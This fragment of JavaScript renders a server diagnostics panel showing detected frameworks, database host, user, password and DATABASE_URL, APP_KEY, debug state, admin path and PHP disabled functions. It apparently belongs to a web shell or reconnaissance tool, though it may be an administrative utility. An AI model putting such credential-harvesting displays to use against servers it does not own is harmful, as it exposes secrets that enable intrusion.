          html += '<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px"><strong style="color:var(--accent);font-size:14px">' + escHtml(fw.name) + '</strong> ' + verBadge + '</div>';
          if (fw.config_path) html += '<div class="diag-item"><span class="diag-label">Config</span><span class="diag-value">' + escHtml(fw.config_path) + '</span></div>';
          var det = fw.details || {};
          if (det.db_host || det.db_name || det.db_user) {
            html += '<div style="margin-top:8px;padding:8px;background:rgba(0,0,0,.2);border-radius:4px;font-size:12px">';
            html += '<div style="color:var(--red);font-weight:600;margin-bottom:4px">Database Credentials</div>';
            if (det.db_host) html += '<div class="diag-item"><span class="diag-label">Host</span><span class="diag-value">' + escHtml(det.db_host) + '</span></div>';
            if (det.db_name) html += '<div class="diag-item"><span class="diag-label">Database</span><span class="diag-value">' + escHtml(det.db_name) + '</span></div>';
            if (det.db_user) html += '<div class="diag-item"><span class="diag-label">User</span><span class="diag-value">' + escHtml(det.db_user) + '</span></div>';
            if (det.db_pass) html += '<div class="diag-item"><span class="diag-label">Password</span><span class="diag-value" style="color:var(--red)">' + escHtml(det.db_pass) + '</span></div>';
            if (det.db_driver) html += '<div class="diag-item"><span class="diag-label">Driver</span><span class="diag-value">' + escHtml(det.db_driver) + '</span></div>';
            if (det.table_prefix) html += '<div class="diag-item"><span class="diag-label">Table prefix</span><span class="diag-value">' + escHtml(det.table_prefix) + '</span></div>';
            if (det.database_url) html += '<div class="diag-item"><span class="diag-label">DATABASE_URL</span><span class="diag-value" style="color:var(--red);word-break:break-all">' + escHtml(det.database_url) + '</span></div>';
            html += '</div>';
          }
          if (det.debug) {
            var debugColor = det.debug === 'enabled' ? 'var(--red)' : 'var(--green)';
            html += '<div class="diag-item"><span class="diag-label">Debug mode</span><span class="badge" style="background:rgba(0,0,0,.2);color:' + debugColor + '">' + escHtml(det.debug) + '</span></div>';
          }
          if (det.app_key) html += '<div class="diag-item"><span class="diag-label">APP_KEY</span><span class="diag-value" style="color:var(--yellow);word-break:break-all">' + escHtml(det.app_key) + '</span></div>';
          if (det.app_env) html += '<div class="diag-item"><span class="diag-label">APP_ENV</span><span class="diag-value">' + escHtml(det.app_env) + '</span></div>';
          if (det.admin_path) html += '<div class="diag-item"><span class="diag-label">Admin path</span><span class="diag-value">' + escHtml(det.admin_path) + '</span></div>';
          if (det.plugins !== undefined) html += '<div class="diag-item"><span class="diag-label">Plugins</span><span class="diag-value">' + det.plugins + '</span></div>';
          if (det.themes !== undefined) html += '<div class="diag-item"><span class="diag-label">Themes</span><span class="diag-value">' + det.themes + '</span></div>';
          if (det.log_file) html += '<div class="diag-item"><span class="diag-label">Log file</span><span class="diag-value">' + escHtml(det.log_file) + '</span></div>';
          html += '</div>';
        });
        html += '</div></div>';
      }

      // ---- Disabled functions ----
      html += '<div class="card"><div class="card-header">&#x1F6AB; Disabled Functions' + diagCopyBtn() + '</div><div class="card-body"><div style="font-family:monospace;font-size:12px;color:var(--muted);word-break:break-all">' + escHtml(d.disable_functions) + '</div></div></div>';

      body.innerHTML = html;
    })
    .catch(function(err) {
      body.innerHTML = '<div style="color:var(--red)">Error: ' + escHtml(String(err)) + '</div>';
    });
}

function formatBytes(b) {
  if (b > 1e9) return (b/1e9).toFixed(1) + ' GB';
  if (b > 1e6) return (b/1e6).toFixed(1) + ' MB';
  return (b/1e3).toFixed(1) + ' KB';
}
